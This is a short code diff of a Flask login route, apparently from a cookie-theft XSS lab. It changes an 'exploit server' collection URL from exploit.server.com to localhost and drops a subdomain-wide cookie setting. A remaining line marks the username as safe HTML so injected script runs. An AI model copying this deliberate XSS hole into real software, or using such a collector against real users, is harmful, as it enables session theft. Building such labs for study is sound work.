@@ -25,7 +25,6 @@ def login():
             f"{username}-session-value",
             httponly=True,
             samesite="Strict",
-            domain=".cds.com"   # 모든 서브도메인에서 접근 가능
         )
 
             return resp
@@ -35,7 +34,7 @@ def login():
     # 현재 요청 호스트/포트 기준으로 exploit 서버 URL 동적 생성
     scheme = request.scheme
     host = request.host.split(':')[0]  # 호스트만
-    exploit_server_url = f"{scheme}://exploit.server.com:8000/collect"
+    exploit_server_url = f"{scheme}://localhost:888/collect"
 
     # username을 HTML에서 스크립트 실행 가능하도록 safe 처리
     safe_username = Markup(username)
